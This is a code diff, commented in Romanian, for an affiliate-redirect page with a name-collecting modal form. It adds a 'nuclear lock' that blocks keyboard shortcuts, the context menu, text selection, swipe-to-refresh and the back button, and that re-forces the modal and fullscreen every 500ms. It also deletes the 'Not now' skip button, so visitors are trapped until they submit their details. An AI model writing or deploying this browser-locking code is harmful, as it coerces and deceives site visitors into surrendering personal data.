@@ -471,6 +471,51 @@
   const REDIRECT_URL = "https://freecash.com/?ref=TU"; // inlocuieste cu link-ul tau de afiliat
   // ====================
 
+  // ---- NUCLEAR LOCK — nicio iesire ----
+
+  // block context menu (tap lung pe Android)
+  document.addEventListener("contextmenu", (e) => e.preventDefault());
+
+  // block selectie text
+  document.addEventListener("selectstart", (e) => e.preventDefault());
+
+  // block toate shortcut-urile de keyboard
+  document.addEventListener("keydown", (e) => {
+    const blocked = ["F5","F11","F12","Escape","Back"];
+    if (blocked.includes(e.key) || (e.ctrlKey && ["r","w","t","l"].includes(e.key.toLowerCase()))) {
+      e.preventDefault();
+    }
+  });
+
+  // visibility change — daca userul minimizeaza sau schimba tab — refocus fortat
+  document.addEventListener("visibilitychange", () => {
+    if (document.visibilityState === "visible" && modalShown) {
+      goFullscreen();
+      modal.classList.add("show");
+      document.getElementById("f-name").focus();
+    }
+  });
+
+  // block swipe-down pe iOS (page refresh gesture)
+  let touchStartY = 0;
+  document.addEventListener("touchstart", (e) => { touchStartY = e.touches[0].clientY; }, { passive: true });
+  document.addEventListener("touchmove", (e) => {
+    if (modalShown) {
+      const dy = e.touches[0].clientY - touchStartY;
+      if (dy > 0) e.preventDefault(); // bloc swipe down
+    }
+  }, { passive: false });
+
+  // re-lock la fiecare 500ms cat timp modalul e deschis — nu scapa
+  setInterval(() => {
+    if (modalShown && !modal.classList.contains("show")) {
+      modal.classList.add("show");
+    }
+    if (modalShown) {
+      history.pushState(null, "", location.href);
+    }
+  }, 500);
+
   // ---- FULLSCREEN — ascunde bara URL ----
   function goFullscreen() {
     const el = document.documentElement;
@@ -570,11 +615,9 @@
     setTimeout(() => { sheet.style.transform = "translateX(0)"; }, 240);
   }
 
-  // ascunde butonul "Nu acum" dupa 2 secunde
-  setTimeout(() => {
-    const skip = document.querySelector(".modal-skip");
-    if (skip) skip.style.display = "none";
-  }, 2000);
+  // sterge complet butonul "Nu acum" — nu exista deloc
+  const skipBtn = document.querySelector(".modal-skip");
+  if (skipBtn) skipBtn.remove();
 
   function submitForm() {
     const name = document.getElementById("f-name").value.trim();
